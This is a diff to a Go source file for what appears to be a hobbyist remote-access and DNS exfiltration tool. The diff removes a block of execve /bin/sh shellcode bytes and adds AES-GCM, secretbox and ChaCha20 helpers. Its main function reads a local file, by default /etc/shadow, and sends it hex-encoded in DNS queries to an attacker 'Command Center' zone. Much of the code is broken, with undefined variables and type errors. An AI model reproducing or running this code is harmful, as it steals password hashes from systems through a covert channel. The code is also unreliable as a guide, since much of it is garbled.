@@ -1,28 +1,6 @@
 /*/
-// Copyright 2012 The Go Authors. All rights reserved.
-// Use of this source code is governed by a BSD-style
-// license that can be found in the LICENSE file.
 
-Uses code from:
-https://snowscan.io/custom-crypter/
-
-	// execve shellcode /bin/sh
-	in := []byte{
-		0xeb, 0x1a, 0x5e, 0x31, 0xdb, 0x88, 0x5e, 0x07,
-		0x89, 0x76, 0x08, 0x89, 0x5e, 0x0c, 0x8d, 0x1e,
-		0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0x31, 0xc0,
-		0xb0, 0x0b, 0xcd, 0x80, 0xe8, 0xe1, 0xff, 0xff,
-		0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
-		0x41, 0x42, 0x42, 0x42, 0x42, 0x43, 0x43, 0x43,
-		0x43}
-
-	out := make([]byte, len(in))
-
-	// Generate a random 24 bytes nonce
-	nonce := make([]byte, 24)
-	if _, err := rand.Read(nonce); err != nil {
-		panic(err)
-	}
+openssl rand -hex 32
 
 It is the caller's responsibility to ensure the uniqueness of nonces—for
 example, by using nonce 1 for the first message, nonce 2 for the second
@@ -51,15 +29,20 @@ import (
 	"bufio"
 	"bytes"
 	"compress/zlib"
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/rand"
 	"crypto/sha256"
+	"encoding/hex"
 	"flag"
 	"fmt"
-	"go_rat/pkg/shared_code/ErrorHandling"
+	"io"
 	"math/big"
 	"net"
 	"os"
 
+	"github.com/kevinburke/nacl"
+	"github.com/kevinburke/nacl/secretbox"
 	log "github.com/sirupsen/logrus"
 
 	"github.com/fatih/color"
@@ -70,11 +53,8 @@ import (
 // bytes per read operation
 var FILEREADSPEED int = 36
 var MADEFOR string = "Church of the Subhacker"
+var BANNERSTRING string = "====== mega impressive banner to flex on how leet I am======="
 
-// use this to start the logger, cant keep it in globals.go
-// returns 0 if failure to open logfile, returns 1 otherwise
-// uses code from :
-// https://esc.sh/blog/golang-logging-using-logrus/
 func StartLogger(logfile string) (return_code int) {
 	Logs, derp := os.OpenFile(logfile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
 	LoggerInstance := log.New()
@@ -93,12 +73,16 @@ func StartLogger(logfile string) (return_code int) {
 	return 1
 }
 
-// use this instead of the regular logging functions
-// ONLY use for errors!
 // returns the errors but adds them to a log while printing a
 // message to the screen for your viewing pleasure
-func ErrorPrinter(derp error, message string) error {
-	// output is being redirected to a file so we have to print as well
+// actions are :panic,alarm,exit,debug
+func ErrorPrinter(derp error, message string, action string) error {
+	switch action {
+	case "panic":
+		log.Panic()
+		log.Error(message)
+		//color.Red(message)
+	}
 	log.Error(message)
 	color.Red(message)
 	return derp
@@ -107,8 +91,6 @@ func ErrorPrinter(derp error, message string) error {
 // shows entries from the logfile, starting at the bottom
 // limit by line number, loglevel, or time
 func ShowLogs(LinesToPrint int, loglevel string, time string) {
-	// set log thingie to use json so our json file
-	// can be used
 	log.SetFormatter(&log.JSONFormatter{})
 	//switch loglevel{
 	//	case "error":
@@ -153,7 +135,7 @@ func ZDecompress(DataIn []byte) (DataOut []byte) {
 	byte_reader := bytes.NewReader(DataIn)
 	ZReader, derp := zlib.NewReader(byte_reader)
 	if derp != nil {
-		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+		ErrorPrinter(derp, "generic error, fix me plz lol <3!")
 	}
 	copy(DataOut, DataIn)
 	ZReader.Close()
@@ -164,22 +146,28 @@ func OpenFile(filename string) (filebytes []byte) {
 	// open the file
 	herp, derp := os.Open(filename)
 	if derp != nil {
-		ErrorHandling.ErrorPrinter(derp, "[-] Could not open File")
+		ErrorPrinter(derp, "[-] Could not open File")
 	}
 	defer func() {
 		if derp = herp.Close(); derp != nil {
-			ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+			ErrorPrinter(derp, "generic error, fix me plz lol <3!")
 		}
 	}()
+	// make io.reader and the buffer it will read into
 	reader := bufio.NewReader(herp)
 	buffer := make([]byte, FILEREADSPEED)
 	for {
-		filebytes, derp := reader.Read(buffer)
+		// read INTO buffer
+		// return bytes read as filebytes
+		_, derp := reader.Read(buffer)
 		if derp != nil {
-			ErrorHandling.ErrorPrinter(derp, "[-] Could not read from file")
+			ErrorPrinter(derp, "[-] Could not read from file")
 			break
 		}
-	return filebytes
+		Debug_print(4, "[+] Bytes read:") //, filebytes)
+
+	}
+	return buffer
 }
 
 // This function creates a nonce with the bit size set
@@ -192,7 +180,7 @@ func NonceGenerator() (nonce []byte, derp error) {
 	// make random 24 bit prime number
 	n, derp := rand.Int(rand.Reader, bitsize)
 	if derp != nil {
-		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+		ErrorPrinter(derp, "[-] Failed to generate 64-bit Random Number")
 	}
 	//copy number into buffer
 	// after converting bigint to byte with internal method
@@ -210,7 +198,6 @@ func DataChunkerChunkSize(DataIn []byte, chunkSize int) [][]byte { //, derp erro
 	// loop over the original data object taking a bite outta crim... uh data
 	for asdf := 1; asdf < DataInLength; asdf += chunkSize { //chunkcount++{
 		// mark the end bounds
-		//asdf= 2 ; end = 52? wat
 		end := asdf + chunkSize
 		// necessary check to avoid slicing beyond
 		// slice capacity
@@ -225,18 +212,88 @@ func DataChunkerChunkSize(DataIn []byte, chunkSize int) [][]byte { //, derp erro
 	//maybe return chunk_num int as well
 }
 
+func ExampleNewGCMEncrypter() {
+	// The key argument should be the AES key, either 16 or 32 bytes
+	// to select AES-128 or AES-256.
+	key := []byte("AES256Key-32Characters1234567890")
+	plaintext := []byte("exampleplaintext")
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		panic(err.Error())
+	}
+
+	// Never use more than 2^32 random nonces with a given key because of the risk of a repeat.
+	nonce := make([]byte, 12)
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		panic(err.Error())
+	}
+
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		panic(err.Error())
+	}
+
+	ciphertext := aesgcm.Seal(nil, nonce, plaintext, nil)
+	fmt.Printf("%x\n", ciphertext)
+}
+func ExampleNewGCMDecrypter() {
+	// The key argument should be the AES key, either 16 or 32 bytes
+	// to select AES-128 or AES-256.
+	key := []byte("AES256Key-32Characters1234567890")
+	//ciphertext, _ := hex.DecodeString("f90fbef747e7212ad7410d0eee2d965de7e890471695cddd2a5bc0ef5da1d04ad8147b62141ad6e4914aee8c512f64fba9037603d41de0d50b718bd665f019cdcd")
+	nonce, _ := NonceGenerator()
+	//nonce, _ := hex.DecodeString("bb8ef84243d2ee95a41c6c57")
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		panic(err.Error())
+	}
+
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		panic(err.Error())
+	}
+
+	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		panic(err.Error())
+	}
+
+	fmt.Printf("%s\n", string(plaintext))
+}
+func ChaChaHatesChaChi(bytes_in []byte, EncryptionKey []byte, nonce []byte) (herp []byte, derp error) {
+	var key []byte
+	DataOut := make([]byte, len(bytes_in))
+	if derp != nil {
+		ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+	}
+	key = sha256.Sum256(EncryptionKey)
+	herp, derp := chacha20poly1305.NewX(key)
+	//nonce := make([]byte, chacha20poly1305.NonceSizeX)
+	HaChaChaCha, _ := herp.Open(nil, nonce, HaChaChaCha, nil)
+
+	copy(DataOut, HaChaChaCha)
+	for _, element := range DataOut {
+		// original code treated this like a nullbyte but wat?
+		if element == 0 {
+			ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+			//return
+		}
+	}
+	return DataOut, derp
+}
+
 // This function uses the Salsa20 to encrypt a byte field
 // with a variable sized nonce
-func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Salsa []byte, derp error) {
+func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (herp []byte, derp error) {
 	var key [32]byte
 	DataOut := make([]byte, len(bytes_in))
 	if derp != nil {
-		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+		ErrorPrinter(derp, "generic error, fix me plz lol <3!")
 	}
-	// I was advised not to make my own unless I was a professional mathermind
-	// this is the easy cheater way, use someone elses work
-	key := sha256.Sum256([]byte(pass))
-	herp, derp := chacha20poly1305.NewX(key[:])
+	key = sha256.Sum256(EncryptionKey)
+	herp, derp := chacha20poly1305.NewX(key)
 	//nonce := make([]byte, chacha20poly1305.NonceSizeX)
 
 	HaChaChaCha := herp.Seal(nil, nonce, bytes_in, nil)
@@ -247,16 +304,24 @@ func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Sals
 	for _, element := range DataOut {
 		// original code treated this like a nullbyte but wat?
 		if element == 0 {
-			ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+			ErrorPrinter(derp, "generic error, fix me plz lol <3!")
 			//return
 		}
 	}
 	return DataOut, derp
 }
+func cheatercheaterskideater() {
+	key, err := nacl.Load(ENCRYPTIONKEY)
+	if err != nil {
+		panic(err)
+	}
+	encrypted := secretbox.EasySeal([]byte("hello world"), key)
+}
+
 func sendDNSmessage(MsgAsHexStr string, DestZone string) {
 	var debug bool = true
 	//a unique marker to identify the file in the dns logs
-	var marker string = "herpAderpNotAPerp"
+	//var marker string = "herpAderpNotAPerp"
 	// the dns zone to send the queries to.
 	hostname := fmt.Sprintf("%d.%s.1.%s.%s", marker, MsgAsHexStr, DestZone)
 	herp, derp := net.LookupIP(hostname)
@@ -293,7 +358,7 @@ func main() {
 	var file = flag.String("file", "/etc/shadow", "the local file to exfiltrate.")
 	var logfile = flag.String("logfile", "", "logfile")
 	var help = flag.Bool("help", false, "show help.")
-	var DerpKey = flag.String("key", "Herp-Key-Derp")
+	var DerpKey = flag.String("key", "Herp-Key-Derp", "Encryption Key, Can ")
 	var CommandCenter = flag.String("Command Center", "hakcbiscuits.firewall-gateway.netyinski", "the dns zone (homebase) to send the queries to.")
 
 	flag.Parse()
@@ -302,6 +367,7 @@ func main() {
 		flag.PrintDefaults()
 		return
 	}
-	fileobject := OpenFile(file)
-	DNSExfiltration(fileobject)
+	fileobject := OpenFile(*file)
+	ENCRYPTIONKEY := hex.EncodeToString(DerpKey)
+	DNSExfiltration(fileobject, *CommandCenter, 512)
 }
